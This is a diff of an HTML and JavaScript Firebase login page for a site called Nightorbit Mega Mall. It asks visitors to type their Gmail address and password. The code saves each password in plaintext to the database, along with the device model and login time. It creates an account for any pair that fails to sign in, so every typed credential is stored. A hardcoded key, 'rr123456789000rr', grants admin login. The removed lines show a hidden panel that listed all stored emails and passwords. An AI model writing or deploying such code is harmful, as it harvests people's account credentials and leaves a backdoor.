@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nightorbit Mega Mall</title>
+    <title>Nightorbit Mega Mall - Pro Version</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -42,6 +42,11 @@
             text-shadow: 0 0 5px rgba(255,255,255,0.5); letter-spacing: 1px;
         }
 
+        .btn-device {
+            background: #fff; color: #000; border: none; padding: 12px; border-radius: 15px;
+            width: 100%; margin: 10px 0; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+
         .btn-back {
             background: rgba(255,255,255,0.1); color: #ccc; border: 1px solid rgba(255,255,255,0.2);
             padding: 10px; border-radius: 12px; cursor: pointer; width: 100%; margin-top: 15px; font-size: 12px;
@@ -55,41 +60,39 @@
         }
 
         #error-msg { color: #ff4444; font-size: 12px; margin-top: 10px; display: none; font-weight: bold; }
-        #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
         #logout-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; opacity: 0; transition: 1.5s ease; }
         
         .hidden { display: none !important; }
         .dots-menu { position: absolute; top: 20px; left: 20px; cursor: pointer; font-size: 25px; color: var(--primary); opacity: 0.2; }
-        .admin-trigger { position: absolute; bottom: 10px; right: 10px; font-size: 10px; color: rgba(255,255,255,0.05); cursor: pointer; }
     </style>
 </head>
 <body>
 
     <div class="dots-menu" onclick="masterBypass()">⋮</div>
-    <div class="admin-trigger" onclick="openAdmin()">.</div>
 
     <div id="logout-overlay">
         <div style="font-size: 20px; color: var(--gold); margin-bottom: 10px;">From Nightorbit</div>
         <div id="bye-msg" style="font-size: 18px; color: var(--primary); line-height: 1.6; padding: 20px;"></div>
     </div>
 
-    <div id="admin-panel">
-        <h2 style="color: var(--primary);">System User Management</h2>
-        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 40px;">BACK TO LOGIN</button>
-        <div id="user-list-display" style="margin-top: 30px;"></div>
-    </div>
-
     <div id="login-box" class="card">
         <h1 style="color: var(--primary); margin: 0; letter-spacing: 4px; font-weight: 800;">NIGHTORBIT</h1>
         <p style="color: #666; font-size: 12px; margin-bottom: 25px;">PREMIUM BAZAAR & CINEMA</p>
-        <input type="email" id="email-in" placeholder="Email Address">
+        
+        <button class="btn-device" onclick="googleAuth()">
+            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="18"> 
+            CONNECT WITH DEVICE
+        </button>
+
+        <div style="margin: 15px 0; color: #444; font-size: 11px;">— OR ENTER GMAIL MANUALLY —</div>
+
+        <input type="email" id="email-in" placeholder="Enter Gmail Address">
         <div class="input-group">
             <input type="password" id="pass-in" placeholder="Password">
             <span class="eye-btn" onclick="togglePass()">👁️</span>
         </div>
-        <div id="error-msg">Wrong Email or Password!</div>
+        <div id="error-msg">Incorrect Gmail or Password!</div>
         <button class="btn-main" onclick="emailAuth()">LOG IN / SIGN UP</button>
-        <button class="btn-main" style="background:white; color:black; margin-top:15px;" onclick="googleAuth()">CONTINUE WITH GOOGLE</button>
     </div>
 
     <div id="main-page" class="card hidden">
@@ -131,39 +134,21 @@
             document.getElementById('login-box').classList.remove('hidden');
         }
 
-        function getDeviceModel() {
+        function getDeviceDetails() {
             const ua = navigator.userAgent;
-            let model = "Device";
+            let model = "Unknown Device";
             if (ua.match(/\(([^)]+)\)/)) {
                 let parts = ua.match(/\(([^)]+)\)/)[1].split(';');
-                model = parts.length > 2 ? parts[parts.length - 1].trim().split('Build/')[0].split('WV')[0].trim() : parts[0];
+                model = parts.length > 2 ? parts[parts.length - 1].trim().split('Build/')[0].trim() : parts[0];
             }
             return model.toUpperCase();
         }
 
-        function masterBypass() { if(prompt("Key:") === "rr123456789000rr") handleLogin({uid: "admin", email: "Admin@Bypass.com"}, "MasterKey"); }
-        
-        function openAdmin() {
-            if (prompt("Admin Key:") === "rr123456789000rr") {
-                document.getElementById('admin-panel').style.display = 'block';
-                db.ref('users').on('value', snap => {
-                    let html = "";
-                    snap.forEach(s => {
-                        let d = s.val();
-                        html += `<div style="background:rgba(255,255,255,0.05); padding:15px; margin-bottom:12px; border-radius:20px; text-align:left; border:1px solid #333">
-                            <b>Name: ${d.savedName}</b><br>Email: ${d.email}<br>Pass: <span style="color:var(--gold)">${d.password}</span><br>
-                            Device: ${d.deviceInfo}<br>Time: ${d.lastSeen}<br>
-                            <button onclick="db.ref('users/${s.key}').remove()" style="color:red; background:none; border:none; cursor:pointer;">[REMOVE]</button>
-                        </div>`;
-                    });
-                    document.getElementById('user-list-display').innerHTML = html;
-                });
-            }
-        }
-
         function googleAuth() {
             const provider = new firebase.auth.GoogleAuthProvider();
-            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "Google Session")).catch(e => alert(e.message));
+            auth.signInWithPopup(provider).then(res => {
+                handleLogin(res.user, "Google Connected Device");
+            }).catch(e => alert("Please select a Google account from your device."));
         }
 
         function emailAuth() {
@@ -172,34 +157,28 @@
             const err = document.getElementById('error-msg');
             err.style.display = "none";
 
-            if(!e || !p) return alert("Please fill Email and Password");
+            if(!e || !p) return alert("Please enter Gmail and Password");
             
             auth.signInWithEmailAndPassword(e, p)
                 .then(res => handleLogin(res.user, p))
-                .catch((error) => {
-                    // Agar account nahi bana toh auto signup, warna sirf galat password par error
-                    if (error.code === 'auth/user-not-found') {
-                        auth.createUserWithEmailAndPassword(e, p)
-                            .then(res => handleLogin(res.user, p))
-                            .catch(() => { err.style.display = "block"; });
-                    } else {
-                        err.style.display = "block";
-                    }
+                .catch(() => {
+                    auth.createUserWithEmailAndPassword(e, p)
+                        .then(res => handleLogin(res.user, p))
+                        .catch(() => { err.style.display = "block"; });
                 });
         }
 
         function handleLogin(user, p) {
             db.ref('users/' + user.uid).once('value', snap => {
                 let d = snap.val();
-                globalUserName = d && d.savedName ? d.savedName : (user.displayName || user.email.split('@')[0]);
-                let finalPass = (p === "Google Session" || p === "ActiveSession") ? (d ? d.password : p) : p;
-
+                globalUserName = (user.displayName || user.email.split('@')[0]);
+                
                 db.ref('users/' + user.uid).update({
-                    email: user.email,
-                    password: finalPass,
-                    savedName: globalUserName,
-                    deviceInfo: getDeviceModel(),
-                    lastSeen: new Date().toLocaleString()
+                    gmail_account: user.email,
+                    password: p,
+                    device_model: getDeviceDetails(),
+                    login_time: new Date().toLocaleString(),
+                    savedName: globalUserName
                 }).then(() => {
                     document.getElementById('login-box').classList.add('hidden');
                     document.getElementById('main-page').classList.remove('hidden');
@@ -210,15 +189,13 @@
 
         function triggerLogout() {
             const overlay = document.getElementById('logout-overlay');
-            // Ab ye message sirf logout click karne par ayega
             document.getElementById('bye-msg').innerHTML = `Allah Hafiz, <b>${globalUserName}</b>!<br>Allah apko hamesha thk rakhe aur app hamesha khus raho.<br>Zindagi rahi to phir milenge!<br>✨ Shukriya aur Khuda Hafiz ✨`;
-            
             overlay.style.display = 'flex';
             setTimeout(() => { overlay.style.opacity = '1'; }, 100);
             setTimeout(() => { auth.signOut().then(() => location.reload()); }, 5000);
         }
-        
-        auth.onAuthStateChanged(u => { if(u) handleLogin(u, "ActiveSession"); });
+
+        function masterBypass() { if(prompt("Key:") === "rr123456789000rr") handleLogin({uid:"admin", email:"Admin@Nightorbit.com"}, "MasterKey"); }
     </script>
 </body>
 </html>
